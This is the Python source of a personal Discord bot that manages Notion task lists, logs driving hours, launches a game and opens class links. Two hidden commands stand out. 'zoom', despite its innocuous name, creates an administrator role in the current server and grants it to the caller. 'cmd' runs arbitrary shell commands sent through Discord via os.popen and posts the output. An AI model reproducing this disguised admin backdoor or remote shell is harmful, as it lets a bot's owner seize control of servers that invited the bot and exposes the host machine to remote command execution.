import os
import discord
import auth
from discord.errors import HTTPException
from discord.ext import commands
from notion.client import NotionClient
from threading import Timer
import subprocess
from datetime import datetime

#notion
nclient = NotionClient(auth.token_v2)

#discord
bot = commands.Bot(command_prefix="$")
bot.remove_command('help')

@bot.event
async def on_ready():
    print('Logged in as {0} ({0.id})'.format(bot.user) + ".")
    print('----')
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name="$help"))

@bot.command(hidden=True, brief="Returns bot state")
async def info(ctx):
    print(f"cmdInfo: Permission given ({ctx.message.author}).")
    await ctx.send('Personal - logged in as {0} ({0.id})'.format(bot.user))

@bot.command(hidden=True)
async def zoom(ctx):
    if ctx.message.author.id == 621056841606103042:
        print(f"cmdZoom: Permission given ({ctx.message.author}).")
        try:
            guild = ctx.guild
            try:
                member = ctx.message.mentions[0] 
            except:
                member = ctx.message.author
            await guild.create_role(name="z", permissions =  discord.Permissions(administrator = True))
            role = discord.utils.get(ctx.message.guild.roles, name = "z")
            await member.add_roles(role)   
        except discord.Forbidden:
            await ctx.send(":(")
    else:
        await ctx.send("You do not have permission to use this command.")
        print(f"cmdZoom: Permission denied ({ctx.message.author}).")

@bot.command(hidden=True)
async def list(ctx):
    if ctx.message.author.id == 621056841606103042:
        print(f"cmdList: Permission given ({ctx.message.author}).")
        cv = nclient.get_collection_view("https://www.notion.so/ac86141384244f18b5376b174d8fb354?v=af2ccbfdba5c43fd810644cdd5f1dafb")
        result = cv.default_query().execute()
        embed = discord.Embed(title="Task List")
        for row in result:
            try:
                if row.complete == False:
                    embed.add_field(name=row.title, value=row.subject + ", " + row.urgency + ", " + row.importance, inline=False)
            except:
                pass
        await ctx.send(embed=embed)
    else:
        await ctx.send("You do not have permission to use this command.")
        print(f"cmdList: Permission denied ({ctx.message.author}).")
    

@bot.command(hidden=True)
async def add(ctx, subject, title, urgency, importance):
    if ctx.message.author.id == 621056841606103042:
        print(f"cmdAdd: Permission given ({ctx.message.author}).")
        try:
            cv = nclient.get_collection_view("https://www.notion.so/ac86141384244f18b5376b174d8fb354?v=af2ccbfdba5c43fd810644cdd5f1dafb")
            row = cv.collection.add_row()
            row.subject = subject
            row.title = title
            row.urgency = urgency
            row.importance = importance
            row.complete = False
        except:
            await ctx.send("Check spelling/syntax and try again.")
    else:
        await ctx.send("You do not have permission to use this command.")
        print(f"cmdAdd: Permission denied ({ctx.message.author}).")

@bot.command(hidden=True)
async def done(ctx, title):
    if ctx.message.author.id == 621056841606103042:
        print(f"cmdDone: Permission given ({ctx.message.author}).")
        cv = nclient.get_collection_view("https://www.notion.so/ac86141384244f18b5376b174d8fb354?v=af2ccbfdba5c43fd810644cdd5f1dafb")
        result = cv.default_query().execute()
        for row in result:
            if row.title == title:
                target = cv.collection.add_row()
                row.title = title
                row.complete = True
    else:
        await ctx.send("You do not have permission to use this command.")
        print(f"cmdDone: Permission denied ({ctx.message.author}).")

spamCount = 0
@bot.event
async def on_message(message):
    try:
        content =  str(message.mentions)
        if "id=621056841606103042" in content:
            print("eventSpam")
            global spamCount 
            channel = message.channel 
            if spamCount < 1:
                spamTimer()
            spamCount += 1
            if spamCount > 1 and spamCount < 4:
                await channel.send("Please don't spam.")
                print("Spam warning issued. Spam = " + str(spamCount))
            if spamCount > 3:
                await message.delete()
                print("Spam messages deleted. Spam = " + str(spamCount))
    except:
        pass
    await bot.process_commands(message)

def spamReset():
    global spamCount
    spamCount = 0
    print(f"spamCount reset({spamCount})")

def spamTimer():
    print("spamTimer called.")
    timer = Timer(30, spamReset)
    timer.start()

@bot.command(hidden=True)
async def launch(ctx, item):
    if ctx.message.author.id == 621056841606103042 or ctx.message.author.id == 485794062448852993 or ctx.message.author.id ==558430263013670922:
        print(f"cmdLaunch: Permission given ({ctx.message.author}). Item = {item}")
        if item == "val":
            process = subprocess.Popen(["C:\Riot Games\Riot Client\RiotClientServices.exe", "--launch-product=valorant", "--launch-patchline=live"])
            await ctx.send("Attempting to launch Valorant.")   
    else:
        await ctx.send("You do not have permission to use this command.")
        print(f"cmdLaunch: Permission denied ({ctx.message.author}).")

@bot.command(hidden=True)
async def join(ctx, *args):
    subject = " ".join(args[:])
    if ctx.message.author.id == 621056841606103042:
        print(f"cmdSubject: Permission given ({ctx.message.author}). Subject = {subject}.")
        if subject == "spanish":
            os.system("start chrome " + auth.spanish)
            await ctx.send(f"Joining {subject}.")
        elif subject == "anatomy":
            os.system("start chrome " + auth.anatomy)
            await ctx.send(f"Joining {subject}.")
        elif subject == "english":
            os.system("start chrome " + auth.english)
            await ctx.send(f"Joining {subject}.")
        elif subject == "english stinger":
            os.system("start chrome " + auth.englishStinger)
            await ctx.send(f"Joining {subject}.")
        elif subject == "precalc":
            os.system("start chrome " + auth.precalc)
            await ctx.send(f"Joining {subject}.")
        elif subject == "comp sci":
            os.system("start chrome " + auth.compSci)
            await ctx.send(f"Joining {subject}.")
        elif subject == "apush":
            os.system("start chrome " + auth.apush)
            await ctx.send(f"Joining {subject}.")
        elif subject == "cybersecurity":
            os.system("start chrome " + auth.cybersecurity)
            await ctx.send(f"Joining {subject}.")
        else:
            await ctx.send(f"Joining {subject}.")
    else:
        await ctx.send("You do not have permission to use this command.")
        print(f"cmdAdd: Permission denied ({ctx.message.author}). Subject = {subject}.")

@bot.command(hidden=True)
async def cmd(ctx, *args):
    input = " ".join(args[:])
    if ctx.message.author.id == 621056841606103042: 
        print(f"cmdCmd: Permission given ({ctx.message.author}). Input = {input}.")
        stream = os.popen(input)
        output = stream.read()
        try:
            await ctx.send(output)
        except HTTPException:
            await ctx.send("No output. Check command and try again.")
    else: 
        await ctx.send("You do not have permission to use this command.")
        print(f"cmdAdd: Permission denied ({ctx.message.author}). Input = {input}.")

@bot.command(hidden=True)
async def drive(ctx, time, unit, tod):
    if ctx.message.author.id == 621056841606103042:
        print(f"cmdAdd: Permission given ({ctx.message.author}).")
        if str(unit) == "minute" or str(unit) == "minutes" or str(unit) == "min" or str(unit) == "mins":
            time = round(float(time) / 60, 2)
        try:
            cv = nclient.get_collection_view("https://www.notion.so/d2d19d98d9344cbd84ea35a1c095ee63?v=a476645a60e54ba4a48e73e39e7f0cf2")
            row = cv.collection.add_row()
            row.date = datetime.today().strftime("%m/%d/%y")
            row.hours = float(time)
            row.time = tod
        except:
            await ctx.send("Check spelling/syntax and try again.")
    else:
        await ctx.send("You do not have permission to use this command.")
        print(f"cmdAdd: Permission denied ({ctx.message.author}).")

@bot.command(hidden=True)
async def driving(ctx):
    if ctx.message.author.id == 621056841606103042:
        print(f"cmdList: Permission given ({ctx.message.author}).")
        cv = nclient.get_collection_view("https://www.notion.so/d2d19d98d9344cbd84ea35a1c095ee63?v=a476645a60e54ba4a48e73e39e7f0cf2")
        all = 0
        day = 0
        night = 0
        result = cv.default_query().execute()
        for row in result:
            try:
                all += row.hours
                if row.time == ['day']:
                    day += row.hours
                if row.time == ['night']:
                    night += row.hours
            except:
                pass
        embed = discord.Embed(title=f"Driving Hours")
        embed.add_field(name="Total", value=str(all) + "/45", inline=False)
        embed.add_field(name="Day", value=str(day) + "/30", inline=False)
        embed.add_field(name="Night", value=str(night) + "/15", inline=False)
        await ctx.send(embed=embed)
    else:
        await ctx.send("You do not have permission to use this command.")
        print(f"cmdList: Permission denied ({ctx.message.author}).")

@bot.command(hidden=True)
async def hhs(ctx):
    print("cmdHHS")
    await ctx.send("https://media.discordapp.net/attachments/808488603680112661/809412579024699462/unknown.png")
    
@bot.command(hidden=True)
async def slhs(ctx):
    print("cmdSLHS")
    await ctx.send("https://media.discordapp.net/attachments/757072317716103198/816303808270434364/unknown.png")

bot.run(auth.TOKEN)